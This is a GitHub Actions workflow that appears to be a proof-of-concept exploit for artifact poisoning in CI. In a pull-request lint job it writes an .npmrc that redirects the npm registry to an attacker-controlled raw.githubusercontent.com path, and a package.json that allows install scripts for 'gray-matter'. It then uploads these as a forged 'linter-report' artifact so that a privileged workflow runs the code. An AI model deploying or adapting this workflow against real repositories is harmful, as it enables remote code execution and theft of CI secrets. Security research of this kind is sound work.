---
name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker artifact for the privileged workflow
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          printf 'FORGED REPORT\n' > linter-report.txt
          echo "$PR_NUMBER" > pr-number.txt
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
          printf '%s\n' '{"name":"poc-project","version":"1.0.0","allowScripts":{"gray-matter":true}}' > package.json

      - name: Upload artifact with attacker-chosen files
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            .npmrc
            package.json
            linter-report.txt
            pr-number.txt
          include-hidden-files: true
          if-no-files-found: ignore
